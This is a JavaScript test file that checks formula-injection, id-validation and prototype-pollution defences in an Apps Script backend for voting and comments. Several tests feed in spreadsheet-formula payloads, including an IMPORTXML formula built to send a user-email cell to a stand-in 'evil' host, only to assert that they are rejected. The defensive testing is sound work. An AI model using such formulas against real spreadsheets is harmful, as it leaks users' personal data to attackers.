/**
 * Executable tests for the input-validation / formula-injection hardening on
 * the backend write handlers (branch fix/be-input-validation-injection).
 *
 * Like handlers.test.js, these eval the REAL apps-script/Code.gs against
 * in-memory sheet stubs, then exercise the shipped functions — not copies.
 *
 * Coverage:
 *  - isValidId charset/length contract (SEC4).
 *  - handleVote writes via getRange().setNumberFormat('@').setValues() so the
 *    Votes range is stored as text — a formula can't seed the user_email column
 *    (BE1); a formula-shaped / oversized videoId is rejected before any write.
 *  - handleAddComment rejects an invalid videoId and demotes an orphan parentId
 *    to a top-level comment while honoring a real parent (SEC4 + SEC14).
 *  - handleCommentsBatch does not crash on a 'constructor'/'toString'/'valueOf'
 *    video_id (BE3, null-prototype map).
 *  - handleStar length-caps the channel (SEC4).
 */
import { describe, it, expect } from 'vitest';
import fs from 'node:fs';
import path from 'node:path';
import { fileURLToPath } from 'node:url';

const HERE = path.dirname(fileURLToPath(import.meta.url));
const SRC = fs.readFileSync(path.resolve(HERE, '../../../apps-script/Code.gs'), 'utf-8');
const CLIENT_ID = SRC.match(/GOOGLE_CLIENT_ID\s*=\s*'([^']+)'/)[1];
const nowSec = () => Math.floor(Date.now() / 1000);

/**
 * An in-memory sheet that records every setNumberFormat / setValues call on the
 * ranges it hands out, so a test can assert the write path formatted its range
 * as text and wrote the expected row. `rows` is header + data (no mutation of
 * the caller's array).
 */
function recordingSheet(rows) {
  const grid = rows.map((r) => r.slice());
  const formats = []; // { numCols, fmt }
  const writes = [];  // { numCols, values }
  return {
    _grid: grid,
    _formats: formats,
    _writes: writes,
    getDataRange: () => ({ getValues: () => grid.map((r) => r.slice()) }),
    getLastRow: () => grid.length,
    getRange: (row, col, numRows, numCols) => ({
      setNumberFormat(fmt) { formats.push({ numCols, fmt }); return this; },
      setValue() { return this; },
      setValues(values) { writes.push({ numCols, values }); return this; },
    }),
    appendRow: (r) => { grid.push(r.slice()); },
  };
}

/**
 * Builds a SpreadsheetApp stub. `first` backs getSheets()[0] (what getSheet()
 * resolves to for VIDEOS/COMMENTS/BLOCKED/META); `named` backs getSheetByName
 * (Votes/Stars/Archive). openById ignores the id, as the other backend tests do.
 */
function spreadsheetApp(first, named = {}) {
  const ss = {
    getSheets: () => [first],
    getSheetByName: (name) => (name in named ? named[name] : null),
    insertSheet: () => first,
  };
  return { openById: () => ss };
}

function memoryCache() {
  const store = new Map();
  const cache = {
    get: (k) => (store.has(k) ? store.get(k) : null),
    put: (k, v) => { store.set(k, v); },
    remove: (k) => { store.delete(k); },
  };
  return { getScriptCache: () => cache, _store: store };
}

/** Eval Code.gs with injected mock globals; return the named functions. */
function loadBackend(mocks = {}) {
  const first = mocks.first || recordingSheet([[]]);
  const globals = {
    UrlFetchApp: mocks.UrlFetchApp || { fetch: () => ({ getResponseCode: () => 200, getContentText: () => '{}' }) },
    SpreadsheetApp: mocks.SpreadsheetApp || spreadsheetApp(first, mocks.named || {}),
    LockService: mocks.LockService || { getScriptLock: () => ({ waitLock() {}, releaseLock() {} }) },
    CacheService: mocks.CacheService || memoryCache(),
    Utilities: mocks.Utilities || {
      getUuid: () => '00000000-0000-0000-0000-000000000000',
      computeDigest: () => [], base64EncodeWebSafe: () => 'x', sleep() {},
      DigestAlgorithm: { MD5: 'MD5', SHA_256: 'SHA_256' },
    },
    Logger: { log() {} },
    ContentService: { createTextOutput: () => ({ setMimeType: () => ({}) }), MimeType: { JSON: 'json' } },
    ScriptApp: mocks.ScriptApp || {}, XmlService: {},
  };
  const names = ['isValidId', 'handleVote', 'handleStar', 'handleAddComment', 'handleCommentsBatch', 'commentExistsOnVideo'];
  const factory = new Function(...Object.keys(globals), `${SRC}\nreturn { ${names.join(', ')} };`);
  return factory(...Object.values(globals));
}

function tokeninfo(payload, code = 200) {
  return { fetch: () => ({ getResponseCode: () => code, getContentText: () => JSON.stringify(payload) }) };
}

const validClaims = () => ({
  aud: CLIENT_ID, iss: 'accounts.google.com', exp: nowSec() + 3600,
  email: 'user@example.com', email_verified: 'true', name: 'User', picture: 'https://x/p.jpg',
});

const VOTE_HEADERS = ['vote_id', 'video_id', 'user_email', 'created_at'];
const STAR_HEADERS = ['star_id', 'channel_name', 'user_email', 'created_at'];
const VIDEO_HEADERS = ['video_id', 'vote_count', 'comment_count'];
const COMMENT_HEADERS = ['comment_id', 'video_id', 'parent_id', 'user_name', 'user_email', 'user_avatar', 'body', 'depth', 'created_at', 'comment_count'];

// A single-finger write to the Votes/Stars tab is exactly 4 columns; the
// comment write is 9. Filter recorded ranges by width to find the right one.
const only = (arr, numCols) => arr.filter((w) => w.numCols === numCols);

describe('isValidId (SEC4 — id charset/length gate)', () => {
  const { isValidId } = loadBackend();

  it('accepts an 11-char YouTube id and a longer alphanumeric article id', () => {
    expect(isValidId('dQw4w9WgXcQ')).toBe(true);
    expect(isValidId('article_123-ABC')).toBe(true);
    expect(isValidId('a'.repeat(64))).toBe(true);
  });

  it('rejects formula-shaped, whitespace, empty, oversized, and non-string ids', () => {
    expect(isValidId('=IMPORTXML("https://evil/?d="&C2,"//a")')).toBe(false);
    expect(isValidId('a b')).toBe(false);
    expect(isValidId('')).toBe(false);
    expect(isValidId('a'.repeat(65))).toBe(false);
    expect(isValidId(undefined)).toBe(false);
    expect(isValidId(123)).toBe(false);
    expect(isValidId(null)).toBe(false);
  });
});

describe('handleVote (BE1 — Votes range stored as text; SEC4 — id gate)', () => {
  function setup() {
    const votes = recordingSheet([VOTE_HEADERS.slice()]);
    const videos = recordingSheet([VIDEO_HEADERS.slice()]);
    const SpreadsheetApp = spreadsheetApp(videos, { Votes: votes, Archive: null });
    const be = loadBackend({ SpreadsheetApp, UrlFetchApp: tokeninfo(validClaims()) });
    return { be, votes };
  }

  it("writes the new vote via a '@'-formatted range, not a bare appendRow", () => {
    const { be, votes } = setup();
    const res = be.handleVote({ videoId: 'dQw4w9WgXcQ', token: 't' });

    expect(res.status).toBe('ok');
    expect(res.voted).toBe(true);

    // The range reserved for the row was number-formatted as text ('@') BEFORE
    // the values were written — so a formula-shaped cell can't auto-execute.
    const fmt = only(votes._formats, 4);
    expect(fmt.length).toBe(1);
    expect(fmt[0].fmt).toBe('@');

    // ...and the value row carries the id + the adjacent user_email column.
    const write = only(votes._writes, 4);
    expect(write.length).toBe(1);
    const row = write[0].values[0];
    expect(row[1]).toBe('dQw4w9WgXcQ');           // video_id
    expect(row[2]).toBe('user@example.com');       // user_email (col C — the exfil target)
  });

  it('rejects a formula-shaped videoId before any row is written', () => {
    const { be, votes } = setup();
    const res = be.handleVote({ videoId: '=IMPORTXML("https://evil/?d="&C2,"//a")', token: 't' });
    expect(res.status).toBe('error');
    expect(res.message).toMatch(/invalid videoid/i);
    expect(only(votes._writes, 4).length).toBe(0); // nothing hit the sheet
  });

  it('rejects an oversized videoId (junk-row flooding)', () => {
    const { be, votes } = setup();
    const res = be.handleVote({ videoId: 'a'.repeat(65), token: 't' });
    expect(res.status).toBe('error');
    expect(only(votes._writes, 4).length).toBe(0);
  });
});

describe('handleAddComment (SEC4 — id gate; SEC14 — parent must exist on the video)', () => {
  function setup(commentRows = []) {
    const comments = recordingSheet([COMMENT_HEADERS.slice(), ...commentRows]);
    const SpreadsheetApp = spreadsheetApp(comments, { Archive: null });
    const be = loadBackend({ SpreadsheetApp, UrlFetchApp: tokeninfo(validClaims()) });
    return { be, comments };
  }

  it('rejects a formula-shaped videoId before any row is written', () => {
    const { be, comments } = setup();
    const res = be.handleAddComment({ videoId: '=HYPERLINK("http://evil")', body: 'hi', token: 't' });
    expect(res.status).toBe('error');
    expect(res.message).toMatch(/invalid videoid/i);
    expect(only(comments._writes, 9).length).toBe(0);
  });

  it('demotes an orphan parentId to a top-level comment (depth 0, parent cleared)', () => {
    const { be, comments } = setup(); // no comments exist → any parentId is orphan
    const res = be.handleAddComment({ videoId: 'VIDEO123AAA', parentId: 'c_ghost', body: 'reply', token: 't' });

    expect(res.status).toBe('ok');
    const write = only(comments._writes, 9);
    expect(write.length).toBe(1);
    const row = write[0].values[0];
    expect(row[2]).toBe('');   // parent_id cleared
    expect(row[7]).toBe(0);    // depth demoted to top-level
  });

  it('keeps a real parent (exists on the same video) as a depth-1 reply', () => {
    const parent = ['c_parent0001', 'VIDEO123AAA', '', 'Parent', 'p@example.com', '', 'parent body', 0, '2026-01-01T00:00:00.000Z', 0];
    const { be, comments } = setup([parent]);
    const res = be.handleAddComment({ videoId: 'VIDEO123AAA', parentId: 'c_parent0001', body: 'reply', token: 't' });

    expect(res.status).toBe('ok');
    const row = only(comments._writes, 9)[0].values[0];
    expect(row[2]).toBe('c_parent0001'); // parent_id preserved
    expect(row[7]).toBe(1);              // threaded reply
  });

  it('treats a parentId that exists only on a DIFFERENT video as orphan', () => {
    const parent = ['c_parent0001', 'OTHERVIDEO0', '', 'Parent', 'p@example.com', '', 'parent body', 0, '2026-01-01T00:00:00.000Z', 0];
    const { be, comments } = setup([parent]);
    const res = be.handleAddComment({ videoId: 'VIDEO123AAA', parentId: 'c_parent0001', body: 'reply', token: 't' });

    expect(res.status).toBe('ok');
    const row = only(comments._writes, 9)[0].values[0];
    expect(row[2]).toBe(''); // not a parent on THIS video → demoted
    expect(row[7]).toBe(0);
  });
});

describe('handleCommentsBatch (BE3 — no prototype-pollution crash)', () => {
  function be(commentRows) {
    const comments = recordingSheet([COMMENT_HEADERS.slice(), ...commentRows]);
    return loadBackend({ SpreadsheetApp: spreadsheetApp(comments) });
  }

  const mk = (id, vid) => [id, vid, '', 'N', 'e@x', '', 'body-' + id, 0, '2026-01-01T00:00:00.000Z', 0];

  it("does not crash when a comment row's video_id is 'constructor'/'toString'/'valueOf'", () => {
    const backend = be([
      mk('c1', 'VIDEOA00001'),
      mk('c2', 'constructor'),
      mk('c3', 'toString'),
      mk('c4', 'valueOf'),
    ]);
    let res;
    expect(() => { res = backend.handleCommentsBatch({ videoIds: 'VIDEOA00001' }); }).not.toThrow();
    expect(res.status).toBe('ok');
    // Only the requested id is a key; the poison rows are silently skipped.
    expect(Object.keys(res.byVideo)).toEqual(['VIDEOA00001']);
    expect(res.byVideo['VIDEOA00001'].map((c) => c.comment_id)).toEqual(['c1']);
  });

  it("safely serves a batch that directly requests a poison id like 'constructor'", () => {
    const backend = be([mk('c2', 'constructor')]);
    let res;
    expect(() => { res = backend.handleCommentsBatch({ videoIds: 'constructor,toString' }); }).not.toThrow();
    expect(res.status).toBe('ok');
    expect(res.byVideo['constructor'].map((c) => c.comment_id)).toEqual(['c2']);
    expect(res.byVideo['toString']).toEqual([]);
  });
});

describe('handleStar (SEC4 — channel length cap)', () => {
  function setup() {
    const stars = recordingSheet([STAR_HEADERS.slice()]);
    const first = recordingSheet([['channel_name', 'user_email']]); // no 'email' col → not blocked
    const SpreadsheetApp = spreadsheetApp(first, { Stars: stars });
    const be = loadBackend({ SpreadsheetApp, UrlFetchApp: tokeninfo(validClaims()) });
    return { be, stars };
  }

  it('rejects an oversized channel with no row written', () => {
    const { be, stars } = setup();
    const res = be.handleStar({ channel: 'x'.repeat(201), token: 't' });
    expect(res.status).toBe('error');
    expect(res.message).toMatch(/invalid channel/i);
    expect(only(stars._writes, 4).length).toBe(0);
  });

  it("stars a normal channel via a '@'-formatted range", () => {
    const { be, stars } = setup();
    const res = be.handleStar({ channel: 'Nico Leonard', token: 't' });
    expect(res.status).toBe('ok');
    expect(res.starred).toBe(true);
    const fmt = only(stars._formats, 4);
    expect(fmt.length).toBe(1);
    expect(fmt[0].fmt).toBe('@');
    expect(only(stars._writes, 4)[0].values[0][1]).toBe('Nico Leonard');
  });
});
